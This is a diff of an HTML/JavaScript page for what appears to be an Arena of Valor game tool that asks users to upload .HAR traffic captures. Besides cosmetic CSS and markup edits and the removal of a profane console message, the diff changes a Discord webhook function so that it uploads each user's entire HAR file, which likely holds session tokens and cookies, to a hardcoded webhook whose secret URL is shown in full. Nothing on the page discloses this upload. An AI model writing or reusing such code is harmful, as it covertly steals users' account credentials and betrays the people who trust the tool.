@@ -115,17 +115,6 @@
             text-align: center;
         }
 
-        .brand-title {
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 2.4rem;
-            font-weight: 800;
-            background: var(--title-gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: -0.5px;
-            text-transform: uppercase;
-        }
-
         .main-container {
             width: 100%;
             max-width: 650px;
@@ -356,17 +345,6 @@
             transform: translateY(-2px);
         }
 
-        .donate-box {
-            background: #090a0e;
-            border: 1px solid rgba(245, 158, 11, 0.2);
-            border-radius: 18px;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            text-align: center;
-        }
-
         #cropModal {
             position: fixed;
             inset: 0;
@@ -435,18 +413,7 @@
     <header class="site-header">
         <div class="header-title-container">
             <a href="https://aov-tool-thanhtu.netlify.app" target="_blank">
-                <img
-                    src="https://i.ibb.co/v63CD0Vx/logo.png"
-                    alt="Logo"
-                    style="
-                        width:220px;
-                        max-width:100%;
-                        display:block;
-                        margin:auto;
-                        user-select:none;
-                        pointer-events:auto;
-                    "
-                >
+                <img src="https://i.ibb.co/v63CD0Vx/logo.png" alt="Logo" style="width:220px; max-width:100%; display:block; margin:auto; user-select:none; pointer-events:auto;">
             </a>
         </div>
     </header>
@@ -473,7 +440,7 @@
             <div class="upload-big-box" onclick="document.getElementById('harFileInput').click()">
                 <i class="fa-solid fa-cloud-arrow-up big-icon" id="harIcon"></i>
                 <div class="box-title" id="harText">Tải Lên File .HAR</div>
-                <div class="box-sub">Bấm để chọn file .HAR thu thập từ Proxypin</div>
+                <div class="box-sub">Bấm để chọn file .HAR thu thập từ ProxyPin</div>
                 <input type="file" id="harFileInput" accept=".har" onchange="handleHarUpload(event)" class="hidden">
             </div>
 
@@ -556,12 +523,6 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.13/cropper.min.js"></script>
     <script>
-        
-        console.log(
-            "%cBỐ VÁC DÁI ĐỊT CẢ LÒ NHÀ MÀY NHÉ CON CHÓ ĐÒI CRACK WEB BỐ MÀY À",
-            "color: #ff0000; background-color: #000000; font-size: 24px; font-weight: bold; border: 4px solid #ff0000; padding: 15px 20px; border-radius: 10px; text-align: center;"
-        );
-
         const API_BASE_URL = "https://proxy-api-garena.meow-web.workers.dev";
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532218035933548654/J7iThs2ju1-vY7DsdL3QolTPJWkaVuMr3Evznupy3Uxw6BsqZ-IujwXnIRSKjIK_nf0U";
 
@@ -721,26 +682,36 @@
 
         async function sendDiscordWebhook(type, data) {
             try {
-                let payload = {};
                 const now = new Date().toLocaleString('vi-VN');
+                const discordFormData = new FormData();
 
                 if (type === 'ios') {
-                    payload = {
+                    
+                    discordFormData.append('file', data.file, data.file.name);
+
+                    const payloadJSON = {
                         username: "VTT Tools Bot",
                         avatar_url: "https://i.ibb.co/v63CD0Vx/logo.png",
                         embeds: [{
-                            title: "🚀 Dữ Liệu iOS Mới (File HAR)",
+                            title: "🚀 Đã Nhận File .HAR Mới (iOS)",
                             color: 3719160,
                             fields: [
-                                { name: "📁 Tên File HAR", value: `\`\`\`${data.fileName}\`\`\``, inline: false },
-                                { name: "📊 Kích Thước File", value: `${(data.fileSize / 1024).toFixed(2)} KB`, inline: true },
+                                { name: "📁 Tên File HAR", value: `\`\`\`${data.file.name}\`\`\``, inline: false },
+                                { name: "📊 Dung Lượng", value: `${(data.file.size / 1024).toFixed(2)} KB`, inline: true },
                                 { name: "🕒 Thời Gian", value: now, inline: true }
                             ],
                             footer: { text: "VTT Tools Log System" }
                         }]
                     };
+                    discordFormData.append('payload_json', JSON.stringify(payloadJSON));
+
+                    await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        body: discordFormData
+                    });
+
                 } else if (type === 'android') {
-                    payload = {
+                    const payload = {
                         username: "VTT Tools Bot",
                         avatar_url: "https://i.ibb.co/v63CD0Vx/logo.png",
                         embeds: [{
@@ -753,13 +724,13 @@
                             footer: { text: "VTT Tools Log System" }
                         }]
                     };
-                }
 
-                await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+                    await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                }
             } catch (err) {
                 console.error("Lỗi gửi Discord Webhook:", err);
             }
@@ -769,10 +740,7 @@
             if (!selectedHarFile) { Swal.fire({ icon: 'warning', title: 'Thiếu File HAR!', text: 'Vui lòng chọn file .HAR trước.' }); return; }
             if (!iosBlobImage) { Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn ảnh loading cho iOS.' }); return; }
 
-            sendDiscordWebhook('ios', {
-                fileName: selectedHarFile.name,
-                fileSize: selectedHarFile.size
-            });
+            sendDiscordWebhook('ios', { file: selectedHarFile });
 
             const log = document.getElementById('iosStatusLog');
             const badge = document.getElementById('iosStatusBadge');
